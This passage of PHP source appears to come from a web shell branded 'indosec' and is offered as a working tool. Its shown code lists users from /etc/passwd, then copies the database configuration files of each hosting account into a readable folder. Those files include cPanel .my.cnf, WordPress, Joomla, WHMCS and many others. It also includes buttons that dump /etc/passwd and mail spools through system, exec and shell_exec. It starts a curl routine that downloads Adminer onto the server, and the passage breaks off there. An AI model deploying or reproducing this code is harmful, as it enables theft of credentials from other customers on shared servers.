    mkdir("indosec_config", 0777);
    $isi_htc = "Options allnRequire NonenSatisfy Any";
    $htc = fopen("indosec_config/.htaccess","w");
    fwrite($htc, $isi_htc);
    preg_match_all('/(.*?):x:/', $passwd, $user_config);
    foreach($user_config[1] as $user_con){
      $user_config_dir = "/home/$user_con/public_html/";
      if(is_readable($user_config_dir)){
        $grab_config = array(
          "/home/$user_con/.my.cnf" => "cpanel",
          "/home/$user_con/public_html/config/koneksi.php" => "Lokomedia",
          "/home/$user_con/public_html/forum/config.php" => "phpBB",
          "/home/$user_con/public_html/sites/default/settings.php" => "Drupal",
            "/home/$user_con/public_html/config/settings.inc.php" => "PrestaShop",
          "/home/$user_con/public_html/app/etc/local.xml" => "Magento",
          "/home/$user_con/public_html/admin/config.php" => "OpenCart",
          "/home/$user_con/public_html/application/config/database.php" => "Ellislab",
          "/home/$user_con/public_html/vb/includes/config.php" => "Vbulletin",
          "/home/$user_con/public_html/includes/config.php" => "Vbulletin",
          "/home/$user_con/public_html/forum/includes/config.php" => "Vbulletin",
          "/home/$user_con/public_html/forums/includes/config.php" => "Vbulletin",
          "/home/$user_con/public_html/cc/includes/config.php" => "Vbulletin",
          "/home/$user_con/public_html/inc/config.php" => "MyBB",
          "/home/$user_con/public_html/includes/configure.php" => "OsCommerce",
          "/home/$user_con/public_html/shop/includes/configure.php" => "OsCommerce",
          "/home/$user_con/public_html/os/includes/configure.php" => "OsCommerce",
          "/home/$user_con/public_html/oscom/includes/configure.php" => "OsCommerce",
          "/home/$user_con/public_html/products/includes/configure.php" => "OsCommerce",
          "/home/$user_con/public_html/cart/includes/configure.php" => "OsCommerce",
          "/home/$user_con/public_html/inc/conf_global.php" => "IPB",
          "/home/$user_con/public_html/wp-config.php" => "Wordpress",
          "/home/$user_con/public_html/wp/test/wp-config.php" => "Wordpress",
          "/home/$user_con/public_html/blog/wp-config.php" => "Wordpress",
          "/home/$user_con/public_html/beta/wp-config.php" => "Wordpress",
          "/home/$user_con/public_html/portal/wp-config.php" => "Wordpress",
          "/home/$user_con/public_html/site/wp-config.php" => "Wordpress",
          "/home/$user_con/public_html/wp/wp-config.php" => "Wordpress",
          "/home/$user_con/public_html/WP/wp-config.php" => "Wordpress",
          "/home/$user_con/public_html/news/wp-config.php" => "Wordpress",
          "/home/$user_con/public_html/wordpress/wp-config.php" => "Wordpress",
          "/home/$user_con/public_html/test/wp-config.php" => "Wordpress",
          "/home/$user_con/public_html/demo/wp-config.php" => "Wordpress",
          "/home/$user_con/public_html/home/wp-config.php" => "Wordpress",
          "/home/$user_con/public_html/v1/wp-config.php" => "Wordpress",
          "/home/$user_con/public_html/v2/wp-config.php" => "Wordpress",
          "/home/$user_con/public_html/press/wp-config.php" => "Wordpress",
          "/home/$user_con/public_html/new/wp-config.php" => "Wordpress",
          "/home/$user_con/public_html/blogs/wp-config.php" => "Wordpress",
          "/home/$user_con/public_html/configuration.php" => "Joomla",
          "/home/$user_con/public_html/blog/configuration.php" => "Joomla",
          "/home/$user_con/public_html/submitticket.php" => "^WHMCS",
          "/home/$user_con/public_html/cms/configuration.php" => "Joomla",
          "/home/$user_con/public_html/beta/configuration.php" => "Joomla",
          "/home/$user_con/public_html/portal/configuration.php" => "Joomla",
          "/home/$user_con/public_html/site/configuration.php" => "Joomla",
          "/home/$user_con/public_html/main/configuration.php" => "Joomla",
          "/home/$user_con/public_html/home/configuration.php" => "Joomla",
          "/home/$user_con/public_html/demo/configuration.php" => "Joomla",
          "/home/$user_con/public_html/test/configuration.php" => "Joomla",
          "/home/$user_con/public_html/v1/configuration.php" => "Joomla",
          "/home/$user_con/public_html/v2/configuration.php" => "Joomla",
          "/home/$user_con/public_html/joomla/configuration.php" => "Joomla",
          "/home/$user_con/public_html/new/configuration.php" => "Joomla",
          "/home/$user_con/public_html/WHMCS/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/whmcs1/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/Whmcs/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/whmcs/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/whmcs/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/WHMC/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/Whmc/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/whmc/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/WHM/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/Whm/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/whm/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/HOST/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/Host/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/host/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/SUPPORTES/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/Supportes/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/supportes/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/domains/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/domain/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/Hosting/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/HOSTING/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/hosting/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/CART/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/Cart/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/cart/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/ORDER/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/Order/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/order/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/CLIENT/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/Client/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/client/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/CLIENTAREA/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/Clientarea/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/clientarea/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/SUPPORT/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/Support/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/support/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/BILLING/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/Billing/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/billing/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/BUY/sumitticket.php" => "WHMCS",
          "/home/$user_con/public_html/Buy/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/buy/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/MANAGE/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/Manage/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/manage/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/CLIENTSUPPORT/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/ClientSupport/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/Clientsupport/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/clientsupport/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/CHECKOUT/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/Checkout/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/checkout/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/BILLINGS/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/Billings/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/billings/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/BASKET/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/Basket/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/basket/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/SECURE/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/Secure/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/secure/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/SALES/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/Sales/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/sales/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/BILL/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/Bill/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/bill/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/PURCHASE/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/Purchase/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/purchase/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/ACCOUNT/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/Account/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/account/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/USER/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/User/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/user/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/CLIENTS/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/Clients/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/clients/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/BILLINGS/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/Billings/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/billings/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/MY/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/My/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/my/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/secure/whm/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/secure/whmcs/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/panel/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/clientes/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/cliente/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/support/order/submitticket.php" => "WHMCS",
          "/home/$user_con/public_html/bb-config.php" => "BoxBilling",
          "/home/$user_con/public_html/boxbilling/bb-config.php" => "BoxBilling",
          "/home/$user_con/public_html/box/bb-config.php" => "BoxBilling",
          "/home/$user_con/public_html/host/bb-config.php" => "BoxBilling",
          "/home/$user_con/public_html/Host/bb-config.php" => "BoxBilling",
          "/home/$user_con/public_html/supportes/bb-config.php" => "BoxBilling",
          "/home/$user_con/public_html/support/bb-config.php" => "BoxBilling",
          "/home/$user_con/public_html/hosting/bb-config.php" => "BoxBilling",
          "/home/$user_con/public_html/cart/bb-config.php" => "BoxBilling",
          "/home/$user_con/public_html/order/bb-config.php" => "BoxBilling",
          "/home/$user_con/public_html/client/bb-config.php" => "BoxBilling",
          "/home/$user_con/public_html/clients/bb-config.php" => "BoxBilling",
          "/home/$user_con/public_html/cliente/bb-config.php" => "BoxBilling",
          "/home/$user_con/public_html/clientes/bb-config.php" => "BoxBilling",
          "/home/$user_con/public_html/billing/bb-config.php" => "BoxBilling",
          "/home/$user_con/public_html/billings/bb-config.php" => "BoxBilling",
          "/home/$user_con/public_html/my/bb-config.php" => "BoxBilling",
          "/home/$user_con/public_html/secure/bb-config.php" => "BoxBilling",
          "/home/$user_con/public_html/support/order/bb-config.php" => "BoxBilling",
          "/home/$user_con/public_html/includes/dist-configure.php" => "Zencart",
          "/home/$user_con/public_html/zencart/includes/dist-configure.php" => "Zencart",
          "/home/$user_con/public_html/products/includes/dist-configure.php" => "Zencart",
          "/home/$user_con/public_html/cart/includes/dist-configure.php" => "Zencart",
          "/home/$user_con/public_html/shop/includes/dist-configure.php" => "Zencart",
          "/home/$user_con/public_html/includes/iso4217.php" => "Hostbills",
          "/home/$user_con/public_html/hostbills/includes/iso4217.php" => "Hostbills",
          "/home/$user_con/public_html/host/includes/iso4217.php" => "Hostbills",
          "/home/$user_con/public_html/Host/includes/iso4217.php" => "Hostbills",
          "/home/$user_con/public_html/supportes/includes/iso4217.php" => "Hostbills",
          "/home/$user_con/public_html/support/includes/iso4217.php" => "Hostbills",
          "/home/$user_con/public_html/hosting/includes/iso4217.php" => "Hostbills",
          "/home/$user_con/public_html/cart/includes/iso4217.php" => "Hostbills",
          "/home/$user_con/public_html/order/includes/iso4217.php" => "Hostbills",
          "/home/$user_con/public_html/client/includes/iso4217.php" => "Hostbills",
          "/home/$user_con/public_html/clients/includes/iso4217.php" => "Hostbills",
          "/home/$user_con/public_html/cliente/includes/iso4217.php" => "Hostbills",
          "/home/$user_con/public_html/clientes/includes/iso4217.php" => "Hostbills",
          "/home/$user_con/public_html/billing/includes/iso4217.php" => "Hostbills",
          "/home/$user_con/public_html/billings/includes/iso4217.php" => "Hostbills",
          "/home/$user_con/public_html/my/includes/iso4217.php" => "Hostbills",
          "/home/$user_con/public_html/secure/includes/iso4217.php" => "Hostbills",
          "/home/$user_con/public_html/support/order/includes/iso4217.php" => "Hostbills"
        );  
        foreach($grab_config as $config => $nama_config){
          $ambil_config = file_get_contents($config);
          if($ambil_config == ''){
          }else{
            $file_config = fopen("indosec_config/$user_con-$nama_config.txt","w");
            fputs($file_config,$ambil_config);
          }
        }
      }    
    }
    echo "<p class='text-center'>Success Get Config!!</p>
    <a href='?dir=$dir/indosec_config' class='btn btn-success btn-block mb-4'>Click Here</a>";
  }else{
    echo "<form method='post'>
      <p class='text-danger'>/etc/passwd error ?  <a href='?dir=$dir&aksi=passwbypass'>Bypass Here</a></p>
      <textarea name='passwd' class='form-control' rows='13'>".file_get_contents('/etc/passwd')."</textarea><br/>
      <input type='submit' class='btn btn-danger btn-block' value='Get Config!!'>
    </form>";
  }
  exit;
}
function aksiBypasswd($dir,$file){
  echo '<div claas="container">
    <form method="POST">
      <p class="text-center">Bypass etc/passwd With :</p>
      <div class="d-flex justify-content-center flex-wrap">
        <input type="submit" class="fiture btn btn-danger btn-sm" value="System Function" name="syst">
        <input type="submit" class="fiture btn btn-danger btn-sm" value="Passthru Function" name="passth">
        <input type="submit" class="fiture btn btn-danger btn-sm" value="Exec Function" name="ex">
        <input type="submit" class="fiture btn btn-danger btn-sm" value="Shell_exec Function" name="shex">
        <input type="submit" class="fiture btn btn-danger btn-sm" value="Posix_getpwuid Function" name="melex">
      </div><hr/>
      <p class="text-center">Bypass User With :</p>
      <div class="d-flex justify-content-center flex-wrap">
        <input type="submit" class="fiture btn btn-warning btn-sm" value="Awk Program" name="awkuser">
        <input type="submit" class="fiture btn btn-warning btn-sm" value="System Function" name="systuser">
        <input type="submit" class="fiture btn btn-warning btn-sm" value="Passthru Function" name="passthuser">  
        <input type="submit" class="fiture btn btn-warning btn-sm" value="Exec Function" name="exuser">    
        <input type="submit" class="fiture btn btn-warning btn-sm" value="Shell_exec Function" name="shexuser">
      </div>
    </form>';
    $mail = 'ls /var/mail';
    $paswd = '/etc/passwd';
    if($_POST['syst']){
      echo"<textarea class='form-control' rows='13'>";
      echo system("cat $paswd");
      echo"</textarea><br/>";
    }
    if($_POST['passth']){
      echo"<textarea class='form-control' rows='13'>";
      echo passthru("cat $paswd");
      echo"</textarea><br/>";
    }
    if($_POST['ex']){
      echo"<textarea class='form-control' rows='13'>";
      echo exec("cat $paswd");
      echo"</textarea><br/>";
    }
    if($_POST['shex']){
      echo"<textarea class='form-control' rows='13'>";
      echo shell_exec("cat $paswd");
      echo"</textarea><br/>";
    }
    if($_POST['melex']){
      echo"<textarea class='form-control' rows='13'>";
      for($uid=0;$uid<6000;$uid++){ 
        $ara = posix_getpwuid($uid);
        if (!empty($ara)){
          while (list ($key, $val) = each($ara)){
            print "$val:";
          }
          print "n";
        }
      }
      echo"</textarea><br/>";
    }
    
    if ($_POST['awkuser']){
      echo"<textarea class='form-control' rows='13'>
        ".shell_exec("awk -F: '{ print $1 }' $paswd | sort")."
      </textarea><br/>";
    }
    if ($_POST['systuser']){
      echo"<textarea class='form-control' rows='13'>";
      echo system("$mail");
      echo "</textarea><br>";
    }
    if ($_POST['passthuser']){
      echo"<textarea class='form-control' rows='13'>";
      echo passthru("$mail");
      echo "</textarea><br>";
    }
    if ($_POST['exuser']){
      echo"<textarea class='form-control' rows='13'>";
      echo exec("$mail");
      echo "</textarea><br>";
    }
    if ($_POST['shexuser']){
      echo"<textarea class='form-control' rows='13'>";
      echo shell_exec("$mail");
      echo "</textarea><br>";
    }
  echo "</div>";
  exit;
}
function aksiAdminer($dir,$file){
  $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
  function adminer($url, $isi){
    $fp = fopen($isi, "w");
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FILE, $fp);
    return curl_exec($ch);
    curl_close($ch);
    fclose($fp);
    ob_flush();
    flush();
  }
  if(file_exists('adminer.php')){
    echo "<a href='$full/adminer.php' target='_blank' class='text-center btn btn-success btn-block mb-3'>Login Adminer</a>";
